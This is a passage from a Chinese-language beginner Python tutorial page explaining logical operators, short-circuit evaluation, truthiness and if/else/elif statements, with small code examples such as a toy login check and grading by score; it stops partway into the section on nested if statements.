class="code"><pre><span class="line">并且`、`或者`、`不`是为了大家好理解，我给它们起的名字，但是专业术语中把它们称之为：`与`、`或`、`非</span><br></pre></td></tr></table></figure><h5 id="逻辑运算符的简单使用"><a href="#逻辑运算符的简单使用" class="headerlink" title="逻辑运算符的简单使用"></a>逻辑运算符的简单使用</h5><p><strong>and</strong></p><p>实现<code>与</code>的功能，通俗的说就是<code>并且</code></p><p>一般的用法：两边都为<code>True</code>，结果才为<code>True</code></p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span> &gt; <span class="number">50</span> <span class="keyword">and</span> <span class="number">90</span> &lt; <span class="number">200</span>  <span class="comment"># 100 &gt; 50结果为True  90 &lt; 200结果为True，就相当于 True and True 所以最后结果是True</span></span><br></pre></td></tr></table></figure><p><strong>or</strong></p><p>实现<code>或</code>的功能，通俗的说就是<code>或者</code></p><p>一般的用法：两边只要有一个<code>True</code>，结果就为<code>True</code></p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span> &gt; <span class="number">50</span> <span class="keyword">or</span> <span class="number">90</span> &gt; <span class="number">200</span>  <span class="comment"># 100 &gt; 50结果为True  90 &gt; 200结果为False，就相当于 True or False 所以最后结果是True</span></span><br></pre></td></tr></table></figure><p><strong>not</strong></p><p>实现<code>非</code>的功能，通俗的说就是<code>不</code></p><p>一般的用法：之前结果为<code>True</code>，那么<code>not True</code>就是<code>False</code>，如果之前是<code>False</code>，那么<code>not False</code>就是<code>True</code></p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">not</span> (<span class="number">100</span> &gt; <span class="number">50</span>)  <span class="comment"># 结果为False，本来100&gt;50的结果是True,但前面加了not就相当于反义，所以最后结果为False</span></span><br><span class="line"><span class="keyword">not</span> (<span class="number">100</span> &lt; <span class="number">50</span>)  <span class="comment"># 结果为True, 本来100&lt;50的结果是False, 但前面加了not其反义的作用，所以最后结果是True</span></span><br></pre></td></tr></table></figure><h5 id="优先级："><a href="#优先级：" class="headerlink" title="优先级："></a><strong>优先级：</strong></h5><blockquote><p><strong>not &gt; and &gt; or</strong> </p></blockquote><ol><li>not与紧跟其后的那个条件是不可分割的</li><li>如果条件语句全部由纯and、或纯or链接，按照从左到右的顺序依次计算即可</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">and</span> <span class="number">10</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="number">4</span> &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span> == <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>对于既有and又有or链接的语句，以and为中心把左右两个条件用<em>括号括起来</em></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res=(<span class="number">10</span> == <span class="number">9</span> <span class="keyword">and</span> <span class="number">0</span> &lt; <span class="number">3</span>) <span class="keyword">or</span> (<span class="string">&#x27;&#x27;</span> == <span class="string">&#x27;egon&#x27;</span> <span class="keyword">and</span> <span class="number">0</span>&gt; <span class="number">3</span>) <span class="keyword">or</span> <span class="keyword">not</span> <span class="literal">True</span> <span class="keyword">or</span> (<span class="string">&#x27;egon&#x27;</span> == <span class="string">&#x27;dsb&#x27;</span> <span class="keyword">and</span> <span class="number">333</span> &gt; <span class="number">100</span>) <span class="keyword">or</span> <span class="number">10</span> &gt; <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h5 id="逻辑运算符与比较运算符一起使用"><a href="#逻辑运算符与比较运算符一起使用" class="headerlink" title="逻辑运算符与比较运算符一起使用"></a>逻辑运算符与比较运算符一起使用</h5><p>示例一：</p><ul><li>需求：怎样实现的用户名与密码同时都相同呢？</li></ul><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)  <span class="comment"># 获取用户名</span></span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)  <span class="comment"># 获取密码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;用户名和密码能校验通过吗？&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(name == <span class="string">&quot;顾安&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;123456&quot;</span>)  <span class="comment"># 输出用户名与密码是否相同</span></span><br></pre></td></tr></table></figure><p>示例二：</p><ul><li>需求：怎样实现老板或者领导就能开门呢？</li></ul><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">role = <span class="string">&quot;老板&quot;</span>  <span class="comment"># 定义角色变量，存储职位</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;能开门吗？&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(role == <span class="string">&quot;老板&quot;</span> <span class="keyword">or</span> role == <span class="string">&quot;领导&quot;</span>)  <span class="comment"># 输出结果</span></span><br></pre></td></tr></table></figure><p>示例三：</p><ul><li>需求：怎样实现不小于18岁的判断呢？</li></ul><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;大于18岁吗？&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(age &gt; <span class="number">18</span>)  <span class="comment"># 方式一：直接用比较运算符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span>(age &lt;= <span class="number">18</span>))  <span class="comment"># 方式二：用了比较运算符与逻辑运算符</span></span><br></pre></td></tr></table></figure><p>示例四：</p><ul><li>需求：年龄在18~50之间的女性</li></ul><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line">gender = <span class="string">&quot;女性&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;符合要求吗？&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">18</span> &lt;= age &lt;= <span class="number">50</span> <span class="keyword">and</span> gender == <span class="string">&quot;女性&quot;</span>)  <span class="comment"># 方式1：简单的写法</span></span><br><span class="line"><span class="built_in">print</span>(age &gt;= <span class="number">18</span> <span class="keyword">and</span> age &lt;= <span class="number">50</span> <span class="keyword">and</span> gender == <span class="string">&quot;女性&quot;</span>)  <span class="comment"># 方式2：一般的写法</span></span><br></pre></td></tr></table></figure><p>示例五：</p><ul><li>需求：年龄在18<del>60岁之间的男性或者年龄在18</del>50岁之间的女性</li></ul><p>参考代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line">gender = <span class="string">&quot;男性&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;符合要求吗？&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>((<span class="number">18</span> &lt;= age &lt;=<span class="number">50</span> <span class="keyword">and</span> gender == <span class="string">&quot;女性&quot;</span>) <span class="keyword">or</span> (<span class="number">18</span> &lt;= age &lt;= <span class="number">60</span> <span class="keyword">and</span> gender == <span class="string">&quot;男性&quot;</span>))</span><br></pre></td></tr></table></figure><h5 id="特殊情况下的逻辑运算符"><a href="#特殊情况下的逻辑运算符" class="headerlink" title="特殊情况下的逻辑运算符"></a>特殊情况下的逻辑运算符</h5><p>我们一般用逻辑运算符时，左右两边的结果是<code>True</code>或者<code>False</code>，最后得到一个<code>True</code>或者<code>False</code></p><p>但，有时逻辑运算符的左右两边不是<code>True</code>或者<code>False</code>，这种情况我们就需要小心一点</p><p><strong>and</strong></p><p>看下面的示例，猜猜看，结果是多少</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">100</span> <span class="keyword">and</span> <span class="number">200</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span> <span class="keyword">and</span> <span class="number">100</span> &gt; <span class="number">50</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">and</span> <span class="number">200</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">and</span> <span class="number">100</span> &gt; <span class="number">50</span>)  <span class="comment"># 输出什么呢？</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">True</span><br><span class="line">0</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>为什么呢？</p><p>答：想要搞懂这个问题，需要有2点</p><p>第1点：</p><p>Python中是有布尔类型的也就是<code>True</code>和<code>False</code> 用<code>True</code>表示<code>真</code> 用<code>False</code>表示<code>假</code>，而在一些其它编程语言中没有，例如C语言中是没有布尔类型的，因此C语言为了能够表示出<code>真</code>、<code>假</code>，就发明了一个规定，只要数字<code>不是0 </code>无论是正数还是负数 统统表示<code>真</code>，只要是<code>0</code>就表示<code>假</code>。</p><p>后来，虽然Python发明了<code>True</code>和<code>False</code>，但它依然保留了C语言中的这种开发者都已经习以为常的习惯，所以Python中也用</p><ul><li>非0表示 <code>真</code></li><li>0表示<code>假</code></li></ul><blockquote><p>除此之外，能表示False的总共有如下这些：False，0，None，空的数据结构（如<code>[]</code>）</p><p><strong>0、None、空三种值对应的布尔值为False，其余全为True</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="literal">None</span> <span class="keyword">and</span> <span class="number">100</span> )</span><br><span class="line"><span class="built_in">print</span>([] <span class="keyword">and</span> <span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>以上两个式子均会输出左边，因为左边的内容均表示False，所以不会进行下一步~~</p></blockquote><p>第2点：</p><p>我们知道<code>and</code>实现的是两边都是<code>True</code>最后结果才是<code>True</code>，否则是<code>False</code>，但是它有个隐藏的功能，</p><p><u>如果左边的表达式不是<code>True</code>那么右边根本不会执行，且将左侧的值当做最后结果</u></p><p><u>如果左边的表达式是<code>True</code>那么右边才会执行，且将右侧的值当做最后的结果</u></p><p>之所以有这个隐藏的功能是因为：<code>and</code>是<code>与</code>的功能，既然左侧已经为<code>假</code>了，也就没有必要看右边了，结果一定是<code>假</code>，只不过此时把左侧的结果当做最后结果而已</p><p>根据上述2点来看：</p><ul><li><p><code>print(100 and 200)</code>，因为100不是0 所以<code>and</code>左边为<code>真</code>，接下来执行右边，此时将200当做最后的结果</p></li><li><p><code>print(100 and 100&gt;50)</code>，因为100不是0 所以为<code>真</code>，执行右边 <code>100&gt;50</code>且将它的结果当做最后的结果，所以最后为&#96;True</p></li><li><p><code>print(0 and 200)</code>，因为<code>and</code>左侧为0 所以为<code>假</code>，不会执行右边，且将左边的结果当做最后结果，所以最后为0</p></li><li><p><code>print(0 and 100&gt;50)</code>，原因与上一条一样，结果为0</p></li></ul><p><strong>or</strong></p><p>有了前面<code>and</code>的额外经验，我们再看<code>or</code>时就简单多了</p><p><code>or</code>的特殊规则如下:</p><ul><li>如果左边为<code>真</code>，那么就把左边的值当做最后的结果</li><li>如果左右为<code>假</code>，那么就把右边的值当做最后的结果</li></ul><p><code>or</code>之所以有这样功能是因为：<code>or</code>是<code>或</code>的功能，既然左侧已经为<code>真</code>了，也就没有必要看右边了，结果一定是<code>真</code>，只不过此时把左侧的结果当做最后结果而已</p><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">100</span> <span class="keyword">or</span> <span class="number">200</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span> <span class="keyword">or</span> <span class="number">100</span>&gt;<span class="number">50</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">or</span> <span class="number">200</span>)  <span class="comment"># 输出什么呢？</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0</span> <span class="keyword">or</span> <span class="number">100</span>&gt;<span class="number">50</span>)  <span class="comment"># 输出什么呢？</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><table><thead><tr><th align="left">逻辑运算符</th><th align="left">表达式</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left"><code>and</code></td><td align="left"><code>x and y</code></td><td align="left">布尔”与”：如果 <code>x </code>为<code> False</code>，<code>x and y </code>返回<code> False</code>，否则它返回 <code>y </code>的值</td><td align="left"><code>True and False</code>， 返回<code> False</code></td></tr><tr><td align="left"><code>or</code></td><td align="left"><code>x or y</code></td><td align="left">布尔”或”：如果 <code>x</code> 是<code> True</code>，它返回<code> True</code>，否则它返回 <code>y</code> 的值</td><td align="left"><code>False or True</code>， 返回<code> True</code></td></tr><tr><td align="left"><code>not</code></td><td align="left"><code>not x</code></td><td align="left">布尔”非”：如果 <code>x</code> 为 <code>True</code>，返回 <code>False</code> 。如果 <code>x</code> 为 <code>False</code>，它返回 <code>True</code></td><td align="left"><code>not True</code> 返回<code> False</code>, <code>not False</code> 返回 <code>True</code></td></tr></tbody></table><h2 id="if-判断语句"><a href="#if-判断语句" class="headerlink" title="if 判断语句"></a>if 判断语句</h2><h5 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h5><p>很多时候当我们打开某个App，需要输入用户名和密码，如果正确那么就可以登录，否则不让使用</p><p>在我们身边这样场景有很多很多，想要实现这样的功能那我们就需要学习<code>if判断</code></p><h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p><code>if</code>是用来进行判断的，其使用格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 要判断的条件:</span><br><span class="line">    条件成立时，要做的事情</span><br></pre></td></tr></table></figure><blockquote><p>在上一句的代码中结尾是：并且当前的语句相对于上句代码有一个缩进，在这个部分的内容就是代码块</p></blockquote><p>示例代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----if判断开始----&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;已经成年了&#x27;</span>)  <span class="comment"># 当前代码处有缩进 缩进为4个空格 一个Tab键</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----if判断结束----&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>if判断总体来说：当条件满足后就要做某些事情，这些事情以及if它们是一个整体</li><li>如果if条件成立后，要做的事情有很多，那么都需要在行首缩进4个空格（只需要敲一个tag键，Pycharm就会自动换行为4个空格）</li></ul><p>示例代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----if判断开始----&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">  <span class="comment"># 如果当前条件不成立则以下三句print都不会打印</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我已经成年了&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我该懂事了&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;尽快学完python开发出去赚钱了&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----if判断结束----&#x27;</span>)  <span class="comment"># 此处代码没有缩进 表示当前打印语句不在if语句控制范围之内，无论if条件是否成立都会执行</span></span><br></pre></td></tr></table></figure><h5 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h5><p>代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------if判断开始------&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我已经成年了&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我该懂事了&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;尽快学完python开发出去赚钱了&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------if判断结束------&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">------<span class="keyword">if</span>判断开始------</span><br><span class="line">我已经成年了</span><br><span class="line">我该懂事了</span><br><span class="line">尽快学完python开发出去赚钱了</span><br><span class="line">------<span class="keyword">if</span>判断结束------</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>age</code>的值是30，所以<code>age &gt;= 18</code>的结果是<code>True</code>，所以就会执行3个<code>print</code></li></ul><p>代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------if判断开始------&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我已经成年了&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------if判断结束------&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">------<span class="keyword">if</span>判断开始------</span><br><span class="line">------<span class="keyword">if</span>判断结束------</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>age</code>的值是<code>16</code>，所以<code>age &gt;= 18</code>的结果是<code>False</code>，所以不会执行<code>print(&quot;我已经成年了&quot;)</code></li></ul><h5 id="案例补充"><a href="#案例补充" class="headerlink" title="案例补充"></a>案例补充</h5><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cool = <span class="literal">True</span></span><br><span class="line">money = <span class="number">2000000</span></span><br><span class="line">height = <span class="number">178</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cool == <span class="literal">True</span> <span class="keyword">and</span> money &gt;= <span class="number">1000000</span> <span class="keyword">and</span> height &gt;= <span class="number">176</span>:</span><br><span class="line">    <span class="comment"># 如果3个条件头满足，那么就是 高富帅</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;恭喜你，你是高富帅&quot;</span>)</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名:&quot;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&quot;顾安&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录成功...&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="随堂练习"><a href="#随堂练习" class="headerlink" title="随堂练习"></a>随堂练习</h5><p>要求：从键盘获取自己的年龄，判断是否大于或者等于18岁，如果满足就输出“哥，已成年，网吧可以去了”</p><ol><li>使用<code>input</code>从键盘中获取数据，并且存入到一个变量中</li><li>使用<code>if</code>语句，来判断 <code>age &gt;= 18</code>是否成立</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">input</span>(<span class="string">&quot;your age:&quot;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(age)</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;you can entry bar&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get out&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="else-判断子句"><a href="#else-判断子句" class="headerlink" title="else 判断子句"></a>else 判断子句</h2><h5 id="引入-3"><a href="#引入-3" class="headerlink" title="引入"></a>引入</h5><p>想一想：在使用<code>if</code>的时候，它只能做到满足条件时要做的事情。那需要在不满足条件的时候做某些事，该怎么办呢？</p><p>答：使用 <code>else</code></p><h5 id="else-与-if-配合使用"><a href="#else-与-if-配合使用" class="headerlink" title="else 与 if 配合使用"></a>else 与 if 配合使用</h5><p>格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    满足条件时要做的事情<span class="number">1</span></span><br><span class="line">    满足条件时要做的事情<span class="number">2</span></span><br><span class="line">    满足条件时要做的事情<span class="number">3</span></span><br><span class="line">    ...(省略)...</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    不满足条件时要做的事情<span class="number">1</span></span><br><span class="line">    不满足条件时要做的事情<span class="number">2</span></span><br><span class="line">    不满足条件时要做的事情<span class="number">3</span></span><br><span class="line">    ...(省略)...</span><br></pre></td></tr></table></figure><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ticket = <span class="literal">True</span>   <span class="comment"># 用True代表有车票，False代表没有车票</span></span><br><span class="line"><span class="keyword">if</span> ticket == <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;有车票，可以上火车&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;终于可以见到Ta了，美滋滋~~~&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有车票，不能上车&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;亲爱的，那就下次见了&quot;</span>）</span><br></pre></td></tr></table></figure><p>结果一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">有车票，可以上火车</span><br><span class="line">终于可以见到Ta了，美滋滋~~~</span><br></pre></td></tr></table></figure><p>结果二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">没有车票，不能上车</span><br><span class="line">亲爱的，那就下次见了</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>无论是在if语句还是在else子句控制的代码之下都需要进行代码缩进！</li></ul><h5 id="随堂练习-1"><a href="#随堂练习-1" class="headerlink" title="随堂练习"></a>随堂练习</h5><p>要求：从键盘输入身高，如果身高没有超过150cm，则进动物园不用买票，否则需要买票。</p><p>提示：<code>input</code>获取的数据不是整数类型，需要用<code>int()</code>转换，例如<code>int(&quot;100&quot;)</code>结果就是整数100</p><p>参考代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">height = <span class="built_in">input</span>(<span class="string">&quot;请输入身高:&quot;</span>)  <span class="comment"># 获取身高</span></span><br><span class="line">height = <span class="built_in">int</span>(height)  <span class="comment"># 类型转换为整数，只有整数才能比较大小</span></span><br><span class="line"><span class="keyword">if</span> height &lt;= <span class="number">150</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可以直接入园，无需购票&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请先购票，再入园&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="elif-判断子句"><a href="#elif-判断子句" class="headerlink" title="elif 判断子句"></a>elif 判断子句</h2><p><code>if</code>能完成条件满足时做可以执行某些代码</p><p><code>if-else</code>能完成条件满足时执行某些代码，不满足时执行另外一些代码</p><p>如果有这样一种情况：当条件1满足时做事情1；条件2满足时做事情2；条件3满足时做事情3，那该怎么实现呢？</p><p>答：<code>elif</code></p><h5 id="elif-使用"><a href="#elif-使用" class="headerlink" title="elif 使用"></a>elif 使用</h5><p><code>elif</code>的使用格式如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    事情<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    事情<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>:</span><br><span class="line">    事情<span class="number">3</span></span><br><span class="line"><span class="comment"># ...省略N个条件...</span></span><br><span class="line"><span class="keyword">elif</span> 条件n:</span><br><span class="line">    事情n</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    以上条件都满足时执行的代码</span><br></pre></td></tr></table></figure><p>说明一：执行流程</p><ul><li>当条件1满足时，执行事情1，然后整个<code>if</code>结束</li><li>当条件1不满足条件2满足时，则执行事情2，然后整个<code>if</code>结束</li><li>当条件1、条件2不满足条件3满足时，则执行事情3，然后整个<code>if</code>结束</li><li>依次类推，如果条件1、条件2、条件3.。。。。条件n-1都不满足且条件n满足，则执行事情n，然后整个<code>if</code>结束</li><li>如果没有任何条件满足，那么就执行else中的事情</li></ul><p>说明二：<code>else</code></p><ul><li><code>else</code>不是必须的，根据实际情况决定是否添加，如果所有条件满足时做的事情很明确，且没有全部都不满足的时候，此时就不用写</li><li>如果当前能考虑的条件都有对应的代码，但不能保证所有条件都考虑到了，此时建议写上<code>else</code></li></ul><h5 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">score = <span class="number">77</span>  <span class="comment"># 定义变量存储分数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span> <span class="keyword">and</span> score &lt;= <span class="number">100</span>:  <span class="comment"># 如果分数在90~100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次考试，等级为A&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">80</span> <span class="keyword">and</span> score &lt; <span class="number">90</span>:  <span class="comment"># 如果分数在80~90</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次考试，等级为B&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">70</span> <span class="keyword">and</span> score &lt; <span class="number">80</span>:  <span class="comment"># 如果分数在70~80</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次考试，等级为C&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">60</span> <span class="keyword">and</span> score &lt; <span class="number">70</span>:  <span class="comment"># 如果分数在60~70</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次考试，等级为D&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">0</span> <span class="keyword">and</span> score &lt; <span class="number">60</span>:  <span class="comment"># 如果分数在60以下</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次考试，等级为E&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># 如果分数不在0~100之间，就认为错误</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;分数有误...&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><p>在<code>if</code>判断中，最多只能有1个<code>else</code>，但可以有N个<code>elif</code>，必须有1个<code>if</code></p><p>下面的写法是错误的</p><p>错误示范1：一个<code>if</code>最多有1个<code>else</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt; <span class="number">60</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈哈1&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈哈2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈哈3&quot;</span>)</span><br></pre></td></tr></table></figure><p>错误示范2：一个<code>if</code>判断必须有1个<code>if</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;哈哈哈2&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>到现在为止，if总体来说学习了3种</p><ul><li>第1种：只判断一个条件，我们用<code>if</code>来实现</li><li>第2种：可判断2个条件（满足、不满足），我们用<code>if...else...</code>来实现</li><li>第3种：可以判断N个条件，我们用<code>if...elif...elif...else...</code>来实现</li></ul><h2 id="if-嵌套"><a href="#if-嵌套" class="headerlink" title="if 嵌套"></a>if 嵌套</h2><h5 id="引入-4"><a href="#引入-4" class="headerlink" title="引入"></a>引入</h5><p>想一想：</p><p>坐火车或者地铁的实际情况是：先进行安检如果安检通过才会判断是否有车票，或者是先检查是否有车票之后才会进行安检，即实际的情况先对某个条件进行判断然后再判断另外一个条件的，这样的情况该怎样解决呢？</p><p>答：</p><p><code>if</code>嵌套</p><h5 id="if-嵌套的格式"><a href="#if-嵌套的格式" class="headerlink" title="if 嵌套的格式"></a>if 嵌套的格式</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    满足条件<span class="number">1</span>时可以做的事情</span><br><span class="line">    